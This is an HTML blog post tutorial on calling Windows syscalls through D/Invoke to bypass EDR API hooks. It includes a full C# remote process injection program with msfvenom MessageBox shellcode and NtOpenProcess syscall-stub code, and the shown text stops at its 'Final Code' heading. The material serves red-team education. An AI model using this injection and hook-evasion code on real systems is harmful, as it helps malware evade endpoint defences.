<!doctype html>
<html lang="en-us">
  <head>
    <title>Syscalls with D/Invoke - Offensive Defence</title>
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.92.2" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="https://offensivedefence.co.uk/css/main.min.f90f5edd436ec7b74ad05479a05705770306911f721193e7845948fb07fe1335.css" />
    <script src="https://kit.fontawesome.com/89e1a73a2b.js" crossorigin="anonymous"></script>

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Syscalls with D/Invoke"/>
<meta name="twitter:description" content="Windows Architecture Primer x86 processors have 4 privilege levels, known as rings, that control access to memory and CPU operations. They range from Ring 0, the most privileged, to Ring 3.
Image credit: Wikipedia
Windows only supports Rings 0 and 3, affectionately known as Kernel and User Mode respectively. The majority of user activity will occur in Ring 3 but applications may cross into Ring 0 when calling a variety of APIs - this is required when accessing the filesystem for example."/>

    <meta property="og:title" content="Syscalls with D/Invoke" />
<meta property="og:description" content="Windows Architecture Primer x86 processors have 4 privilege levels, known as rings, that control access to memory and CPU operations. They range from Ring 0, the most privileged, to Ring 3.
Image credit: Wikipedia
Windows only supports Rings 0 and 3, affectionately known as Kernel and User Mode respectively. The majority of user activity will occur in Ring 3 but applications may cross into Ring 0 when calling a variety of APIs - this is required when accessing the filesystem for example." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://offensivedefence.co.uk/posts/dinvoke-syscalls/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-01-24T15:19:05+00:00" />
<meta property="article:modified_time" content="2021-01-24T15:19:05+00:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://offensivedefence.co.uk"><img class="app-header-avatar" src="/avatar.png" alt="John Doe" /></a>
      <h1>Offensive Defence</h1>
      <p>&#34;The hand which strikes also blocks.&#34;</p>

    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">Syscalls with D/Invoke</h1>
      <div class="post-meta">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
</svg>
              <a class="tag" href="https://offensivedefence.co.uk/authors/rastamouse/">Rasta Mouse</a>
        
      
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Jan 24, 2021
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          11 min read
        </div><div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
</svg>
          <a class="tag" href="https://offensivedefence.co.uk/tags/c#/">c#</a><a class="tag" href="https://offensivedefence.co.uk/tags/.net/">.net</a><a class="tag" href="https://offensivedefence.co.uk/tags/dinvoke/">dinvoke</a><a class="tag" href="https://offensivedefence.co.uk/tags/syscalls/">syscalls</a><a class="tag" href="https://offensivedefence.co.uk/tags/edr/">edr</a></div></div>
    </header>
    <div class="post-content">
      <h3 id="windows-architecture-primer">Windows Architecture Primer</h3>
<p>x86 processors have 4 privilege levels, known as rings, that control access to memory and CPU operations.  They range from Ring 0, the most privileged, to Ring 3.</p>
<p><img src="/images/dinvoke-syscalls/rings.png" alt="" title="Protection Rings"></p>
<p><sub>Image credit: Wikipedia</sub></p>
<p>Windows only supports Rings 0 and 3, affectionately known as Kernel and User Mode respectively.  The majority of user activity will occur in Ring 3 but applications may cross into Ring 0 when calling a variety of APIs - this is required when accessing the filesystem for example.</p>
<p>There is also a hierarchy to the native APIs.  User applications will generally call &ldquo;high-level&rdquo; APIs in kernel32 and user32 etc, and those APIs will call &ldquo;low-level&rdquo; APIs in ntdll.</p>
<p><img src="/images/dinvoke-syscalls/api.png" alt="" title="API Architecture"></p>
<p><sub>Image credit: TechNet</sub></p>
<p>If you&rsquo;re familiar with basic process injection, you will know that APIs such as <code>OpenProcess</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code> are often used - all of which live inside kernel32.</p>
<p><code>OpenProcess</code> itself calls <code>NtOpenProcess</code> which can be observed in a tool such as <a href="http://www.rohitab.com/apimonitor">API Monitor</a>.</p>
<p><img src="/images/dinvoke-syscalls/openprocess.png" alt="" title="OpenProcess / NtOpenProcess"></p>
<p>Security vendors realised that if they were going to detect and/or block this type of activity, then they would need to hook these APIs.  There are different types of hooks that we won&rsquo;t look into detail here - but think of a hook as a type of man-in-the-middle.  Instead of pointing to the real function, an API call is redirected to a vendor-controlled module where it can be inspected and/or dropped.</p>
<p><img src="/images/dinvoke-syscalls/hooks.png" alt="" title="Basic hooking"></p>
<p><sub>Image credit: Practical Malware Analysis</sub></p>
<p>At first, vendors were only hooking APIs within kernel32, such as <code>OpenProcess</code>.  Attackers could circumvent this by calling <code>NtOpenProcess</code> directly (illustrated above) which would effectively bypass the vendors hook.  Vendors obviously started to push back by also hooking the corresponding Nt* functions as well.</p>
<p>So where do we go next?</p>
<h3 id="syscalls">Syscalls</h3>
<p>A system call (syscall) is the means by which <code>ntdll</code> transitions to the kernel.  We can &ldquo;unassemble&rdquo; NtOpenProcess in WinDBG easily enough to see the instructions.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">0:000&gt; u ntdll!NtOpenProcess
ntdll!NtOpenProcess:
00007ffd`8570c460 4c8bd1          mov     r10,rcx
00007ffd`8570c463 b826000000      mov     eax,26h
00007ffd`8570c468 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffd`8570c470 7503            jne     ntdll!NtOpenProcess+0x15 (00007ffd`8570c475)
00007ffd`8570c472 0f05            syscall
00007ffd`8570c474 c3              ret
00007ffd`8570c475 cd2e            int     2Eh
00007ffd`8570c477 c3              ret
</code></pre></div><p>There are also excellent <a href="https://j00ru.vexillium.org/">syscall lookup tables</a> that we can use as well.</p>
<p>D/Invoke has an excellent method called <code>GetSyscallStub</code> that will read <code>ntdll</code> from disk and find the syscall for a given API.  To demonstrate - this is the API trace of the typical OpenProcess/VirtualAllocEx/WriteProcessMemory/CreateRemoteThread (I&rsquo;ve blurred ones that are not directly related to the injection to preserve the clarity of the calls we want to focus on).</p>
<p><img src="/images/dinvoke-syscalls/injection-trace.png" alt="" title="Original API Trace"></p>
<p>This was tested with the following code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">using</span> System;
<span style="color:#66d9ef">using</span> System.Runtime.InteropServices;

<span style="color:#66d9ef">namespace</span> ConsoleApp1
{
    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
    {
        <span style="color:#75715e">// msfvenom -p windows/x64/messagebox EXITFUNC=thread -f csharp
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">readonly</span> <span style="color:#66d9ef">byte</span>[] <span style="color:#ae81ff">_</span>shellcode = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">323</span>] {
            <span style="color:#ae81ff">0xfc</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x81</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0xf0</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xe8</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x51</span>,
            <span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x51</span>,<span style="color:#ae81ff">0x56</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xd2</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x60</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,
            <span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,
            <span style="color:#ae81ff">0x0f</span>,<span style="color:#ae81ff">0xb7</span>,<span style="color:#ae81ff">0x4a</span>,<span style="color:#ae81ff">0x4a</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x7c</span>,<span style="color:#ae81ff">0x02</span>,
            <span style="color:#ae81ff">0x2c</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x0d</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0xe2</span>,<span style="color:#ae81ff">0xed</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x51</span>,<span style="color:#ae81ff">0x3e</span>,
            <span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0x88</span>,
            <span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x85</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0x74</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x48</span>,
            <span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0xe3</span>,<span style="color:#ae81ff">0x5c</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x3e</span>,
            <span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x34</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd6</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x41</span>,
            <span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x0d</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0x38</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0xf1</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0x03</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0x24</span>,
            <span style="color:#ae81ff">0x08</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0x39</span>,<span style="color:#ae81ff">0xd1</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0xd6</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0x24</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,
            <span style="color:#ae81ff">0x66</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x0c</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0x1c</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x3e</span>,
            <span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x04</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x5e</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0x41</span>,
            <span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0xec</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x41</span>,
            <span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x12</span>,<span style="color:#ae81ff">0xe9</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x5d</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0xc7</span>,<span style="color:#ae81ff">0xc1</span>,
            <span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8d</span>,<span style="color:#ae81ff">0x95</span>,<span style="color:#ae81ff">0x1a</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0x8d</span>,
            <span style="color:#ae81ff">0x85</span>,<span style="color:#ae81ff">0x2b</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0x56</span>,<span style="color:#ae81ff">0x07</span>,<span style="color:#ae81ff">0xff</span>,
            <span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0xbb</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x1d</span>,<span style="color:#ae81ff">0x2a</span>,<span style="color:#ae81ff">0x0a</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0xa6</span>,<span style="color:#ae81ff">0x95</span>,<span style="color:#ae81ff">0xbd</span>,<span style="color:#ae81ff">0x9d</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0x48</span>,
            <span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0xc4</span>,<span style="color:#ae81ff">0x28</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x06</span>,<span style="color:#ae81ff">0x7c</span>,<span style="color:#ae81ff">0x0a</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0xfb</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0x05</span>,<span style="color:#ae81ff">0xbb</span>,<span style="color:#ae81ff">0x47</span>,<span style="color:#ae81ff">0x13</span>,
            <span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x6a</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x89</span>,<span style="color:#ae81ff">0xda</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x6f</span>,
            <span style="color:#ae81ff">0x2c</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x66</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x6d</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x53</span>,<span style="color:#ae81ff">0x46</span>,<span style="color:#ae81ff">0x21</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x73</span>,
            <span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x67</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x78</span>,<span style="color:#ae81ff">0x00</span> };

    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
        {
            <span style="color:#66d9ef">var</span> hProcess = OpenProcess(
                <span style="color:#ae81ff">0x001F0FFF</span>,
                <span style="color:#66d9ef">false</span>,
                <span style="color:#66d9ef">int</span>.Parse(args[<span style="color:#ae81ff">0</span>]));

            <span style="color:#66d9ef">var</span> hRegion = VirtualAllocEx(
                hProcess,
                IntPtr.Zero,
                (<span style="color:#66d9ef">uint</span>)<span style="color:#ae81ff">_</span>shellcode.Length,
                <span style="color:#ae81ff">0x1000</span> | <span style="color:#ae81ff">0x2000</span>,
                <span style="color:#ae81ff">0x04</span>); <span style="color:#75715e">// PAGE_READWRITE
</span><span style="color:#75715e"></span>
            WriteProcessMemory(
                hProcess,
                hRegion,
                <span style="color:#ae81ff">_</span>shellcode,
                (<span style="color:#66d9ef">uint</span>)<span style="color:#ae81ff">_</span>shellcode.Length,
                <span style="color:#66d9ef">out</span> UIntPtr <span style="color:#ae81ff">_</span>);

            VirtualProtectEx(
                hProcess,
                hRegion,
                (UIntPtr)<span style="color:#ae81ff">_</span>shellcode.Length,
                <span style="color:#ae81ff">0x20</span>,  <span style="color:#75715e">// PAGE_EXECUTE_READ
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">out</span> <span style="color:#66d9ef">uint</span> <span style="color:#ae81ff">_</span>);

            CreateRemoteThread(
                hProcess,
                IntPtr.Zero,
                <span style="color:#ae81ff">0</span>,
                hRegion,
                IntPtr.Zero,
                <span style="color:#ae81ff">0</span>,
                IntPtr.Zero);
        }
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr OpenProcess(
            <span style="color:#66d9ef">int</span> dwDesiredAccess,
            <span style="color:#66d9ef">bool</span> bInheritHandle,
            <span style="color:#66d9ef">int</span> dwProcessId);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            <span style="color:#66d9ef">uint</span> dwSize,
            <span style="color:#66d9ef">uint</span> flAllocationType,
            <span style="color:#66d9ef">uint</span> flProtect);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">bool</span> WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            <span style="color:#66d9ef">byte</span>[] lpBuffer,
            <span style="color:#66d9ef">uint</span> nSize,
            <span style="color:#66d9ef">out</span> UIntPtr lpNumberOfBytesWritten);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">bool</span> VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            UIntPtr dwSize,
            <span style="color:#66d9ef">uint</span> flNewProtect,
            <span style="color:#66d9ef">out</span> <span style="color:#66d9ef">uint</span> lpflOldProtect);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            <span style="color:#66d9ef">uint</span> dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            <span style="color:#66d9ef">uint</span> dwCreationFlags, IntPtr lpThreadId);
    }
}
</code></pre></div><p>We shall now replace the standard P/Invoke with syscalls for each of these APIs.</p>
<h3 id="getsyscallstub">GetSyscallStub</h3>
<p>The first step is to replace the P/Invoke signatures with corresponding delegates targeting the Nt functions.  For instance, OpenProcess will be replaced with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
<span style="color:#66d9ef">delegate</span> NTSTATUS NtOpenProcess(
    <span style="color:#66d9ef">ref</span> IntPtr ProcessHandle,
    <span style="color:#66d9ef">uint</span> DesiredAccess,
    <span style="color:#66d9ef">ref</span> OBJECT_ATTRIBUTES ObjectAttributes,
    <span style="color:#66d9ef">ref</span> CLIENT_ID ClientId);
<span style="color:#a6e22e">                
</span><span style="color:#a6e22e">[StructLayout(LayoutKind.Sequential, Pack = 0)]</span>
<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">OBJECT_ATTRIBUTES</span>
{
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> Length;
    <span style="color:#66d9ef">public</span> IntPtr RootDirectory;
    <span style="color:#66d9ef">public</span> IntPtr ObjectName;
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> Attributes;
    <span style="color:#66d9ef">public</span> IntPtr SecurityDescriptor;
    <span style="color:#66d9ef">public</span> IntPtr SecurityQualityOfService;
}
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">[StructLayout(LayoutKind.Sequential)]</span>
<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CLIENT_ID</span>
{
    <span style="color:#66d9ef">public</span> IntPtr UniqueProcess;
    <span style="color:#66d9ef">public</span> IntPtr UniqueThread;
}
</code></pre></div><p>(<a href="https://github.com/TheWover/DInvoke/blob/main/DInvoke/DInvoke/SharedData/Native.cs">NTSTATUS</a> is a pretty big enum that I&rsquo;ve excluded for brevity).</p>
<p>Next, get a pointer to the syscall:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">IntPtr stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtOpenProcess&#34;</span>);
</code></pre></div><p><code>GetSyscallStub</code> only takes a <code>FunctionName</code> and not a target DLL, since syscalls only exist in <code>ntdll</code>.</p>
<p>Marshal that pointer to the delegate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">NtOpenProcess ntOpenProcess = (NtOpenProcess) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtOpenProcess));
</code></pre></div><p>And then call the method:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">IntPtr hProcess = IntPtr.Zero;
OBJECT_ATTRIBUTES oa = <span style="color:#66d9ef">new</span> OBJECT_ATTRIBUTES();

CLIENT_ID ci = <span style="color:#66d9ef">new</span> CLIENT_ID
{
    UniqueProcess = (IntPtr)<span style="color:#66d9ef">uint</span>.Parse(args[<span style="color:#ae81ff">0</span>])
};

NTSTATUS result = ntOpenProcess(
    <span style="color:#66d9ef">ref</span> hProcess,
    <span style="color:#ae81ff">0x001F0FFF</span>,
    <span style="color:#66d9ef">ref</span> oa,
    <span style="color:#66d9ef">ref</span> ci);
</code></pre></div><p>The return code should be Success and hProcess now contains a value.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">result
Success

hProcess
<span style="color:#ae81ff">0x00000000000003bc</span>
</code></pre></div><h3 id="final-code">Final Code</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">using</span> DInvoke.DynamicInvoke;

<span style="color:#66d9ef">using</span> System;
<span style="color:#66d9ef">using</span> System.Runtime.InteropServices;

